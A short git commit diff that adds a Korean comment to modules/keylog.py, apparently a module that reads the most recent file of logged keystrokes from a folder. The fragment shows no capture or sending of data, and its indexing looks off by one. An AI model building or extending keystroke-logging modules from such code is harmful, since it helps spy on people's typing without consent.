51d7e6a233a4456504ac4e896d7ff29accd987c0
5123khw <5123khw@naver.com>
2016-01-21 18:24:12 +0900

    Update keylog.py

--- modules/keylog.py
+++ modules/keylog.py
@@ -8,7 +8,7 @@ def run(**args):
   str=""
   for file in files:
     count+=1
-  fileName+=files[count]
+  fileName+=files[count] #시간은 증가하므로 폴더 내의 가장 마지막 파일이 가장 최근 파일이다.
   fp=open(fileName,"r")
   words=fp.readlines()
   for word in words:
